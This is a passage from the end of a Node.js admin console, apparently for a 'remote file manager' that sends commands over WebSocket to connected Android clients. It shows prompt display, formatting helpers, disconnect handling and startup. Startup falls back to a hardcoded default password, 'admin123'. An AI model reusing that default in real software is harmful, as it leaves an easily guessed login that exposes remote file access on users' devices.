      const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
      clientInfo = chalk.yellow(` → Client ${this.selectedClient}`) + chalk.magenta(` ${currentPath}`);
    } else {
      clientInfo = chalk.gray(' → Broadcast');
    }

    this.rl.setPrompt(`${status} [${adminInfo}${clientInfo}] > `);
    this.rl.prompt();
  }

  formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);

    if (hours > 0) return `${hours}h ${minutes % 60}m`;
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
    return `${seconds}s`;
  }

  disconnect() {
    console.log(chalk.yellow('\n👋 Desconectando...'));

    if (this.ws) {
      this.ws.close();
    }

    if (this.rl) {
      this.rl.close();
    }

    console.log(chalk.green('✅ Desconectado com sucesso!'));
    process.exit(0);
  }
}

// Capturar sinais de encerramento
process.on('SIGINT', () => {
  console.log(chalk.yellow('\n\n⚡ Recebido SIGINT (Ctrl+C)'));
  if (global.adminClient) {
    global.adminClient.disconnect();
  } else {
    process.exit(0);
  }
});

// Iniciar o cliente admin
const args = process.argv.slice(2);
const serverUrl = args[0] || 'ws://localhost:8080';
const password = args[1] || 'admin123';

try {
  console.clear();
  console.log(chalk.green.bold('╔════════════════════════════════════════╗'));
  console.log(chalk.green.bold('║   REMOTE FILE MANAGER - ADMIN CLIENT   ║'));
  console.log(chalk.green.bold('╚════════════════════════════════════════╝'));
  console.log(chalk.cyan(`\n🔗 Servidor: ${serverUrl}`));
  console.log(chalk.gray(`🔐 Senha: ${'*'.repeat(password.length)}\n`));

  global.adminClient = new AdminClient(serverUrl, password);

} catch (error) {
  console.error(chalk.red('❌ Erro ao iniciar cliente admin:'), error.message);
  process.exit(1);
}
